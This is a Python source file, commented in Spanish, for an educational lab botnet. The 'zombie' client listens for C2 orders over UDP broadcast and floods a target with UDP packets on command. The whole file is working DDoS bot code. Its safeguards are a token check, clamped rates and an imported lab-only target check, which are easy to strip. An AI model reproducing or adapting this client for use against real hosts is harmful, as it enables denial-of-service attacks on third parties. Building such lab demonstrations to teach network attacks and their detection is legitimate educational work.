#!/usr/bin/env python3
"""
zombie.py - Bot/zombi de la botnet de laboratorio.

Se queda escuchando ordenes del C2 en el puerto de control (UDP broadcast). Cuando
recibe una orden "attack" valida, genera trafico UDP contra la victima durante el
tiempo indicado. Arranca una instancia de este script en cada maquina zombi del
laboratorio (o varias en la misma maquina para la demo).

Uso:
    python zombie.py
    python zombie.py --id zombie-1 --control-port 50000

Para la demo: abre 1 zombi, lanza el ataque y mira Wireshark; luego 2 zombis; luego 3.
El guardarrail solo permite victimas en rango privado/loopback.
"""

import argparse
import json
import socket
import threading
import time

from common import (
    CONTROL_PORT, CAMPAIGN_TOKEN, is_lab_target, clamp,
    MAX_DURATION, MAX_PPS, MAX_SIZE,
)


class Attacker:
    """Genera el trafico UDP contra la victima. Un ataque a la vez por zombi."""

    def __init__(self, zombie_id: str):
        self.zombie_id = zombie_id
        self._stop = threading.Event()
        self._thread = None

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def start(self, target_ip: str, target_port: int, duration: int, pps: int, size: int):
        if self.is_running():
            print(f"[{self.zombie_id}] Ya hay un ataque en curso; ignoro la nueva orden.")
            return
        # Acotamos la carga: la simulacion nunca es un flood sin limites.
        duration = clamp(duration, 1, MAX_DURATION)
        pps = clamp(pps, 1, MAX_PPS)
        size = clamp(size, 1, MAX_SIZE)
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run, args=(target_ip, target_port, duration, pps, size), daemon=True
        )
        self._thread.start()

    def _run(self, target_ip: str, target_port: int, duration: int, pps: int, size: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"X" * max(1, size)
        interval = 1.0 / max(1, pps)  # control de ritmo; pps siempre >= 1 (acotado)
        sent = 0
        start = time.time()
        deadline = start + duration
        next_tick = start

        print(f"[{self.zombie_id}] >>> Ataque a {target_ip}:{target_port} "
              f"durante {duration}s (~{pps} pps, {size}B)")
        try:
            while time.time() < deadline and not self._stop.is_set():
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    sent += 1
                except OSError:
                    pass  # buffers llenos, etc.: seguimos
                if interval:
                    next_tick += interval
                    sleep = next_tick - time.time()
                    if sleep > 0:
                        time.sleep(sleep)
        finally:
            sock.close()
            elapsed = max(time.time() - start, 1e-6)
            print(f"[{self.zombie_id}] <<< Fin. Enviados {sent} paquetes "
                  f"({sent / elapsed:,.0f} pps reales, {sent * size / 1024:,.0f} KB).")

    def stop(self):
        self._stop.set()


def listen(zombie_id: str, control_port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", control_port))  # "" para recibir tambien broadcast
    attacker = Attacker(zombie_id)

    print(f"[{zombie_id}] Escuchando ordenes del C2 en UDP/{control_port}. Ctrl+C para salir.")
    try:
        while True:
            data, addr = sock.recvfrom(65535)
            try:
                order = json.loads(data.decode("utf-8"))
            except (ValueError, UnicodeDecodeError):
                continue

            # El JSON debe ser un objeto; un numero, lista o string valido no vale.
            if not isinstance(order, dict):
                continue
            if order.get("token") != CAMPAIGN_TOKEN:
                continue
            if order.get("cmd") != "attack":
                continue

            target_ip = str(order.get("target_ip", ""))
            if not is_lab_target(target_ip):
                print(f"[{zombie_id}] Orden rechazada: {target_ip} no es objetivo de laboratorio.")
                continue

            # Campos numericos tolerantes a basura: si no son enteros, descartamos la orden.
            try:
                target_port = int(order.get("target_port", 0))
                duration = int(order.get("duration", 10))
                pps = int(order.get("pps", 2000))
                size = int(order.get("size", 512))
            except (TypeError, ValueError):
                print(f"[{zombie_id}] Orden descartada: parametros numericos invalidos.")
                continue

            if not (0 < target_port < 65536):
                print(f"[{zombie_id}] Orden descartada: puerto invalido ({target_port}).")
                continue

            print(f"[{zombie_id}] Orden recibida de {addr[0]}.")
            attacker.start(target_ip, target_port, duration, pps, size)
    except KeyboardInterrupt:
        print(f"\n[{zombie_id}] Saliendo.")
    finally:
        attacker.stop()
        sock.close()


def main():
    p = argparse.ArgumentParser(description="Zombi de la botnet de laboratorio (PoC educativo).")
    p.add_argument("--id", default="zombie", help="Identificador de este zombi (para los logs)")
    p.add_argument("--control-port", type=int, default=CONTROL_PORT,
                   help=f"Puerto UDP de control (def. {CONTROL_PORT})")
    args = p.parse_args()
    listen(args.id, args.control_port)


if __name__ == "__main__":
    main()
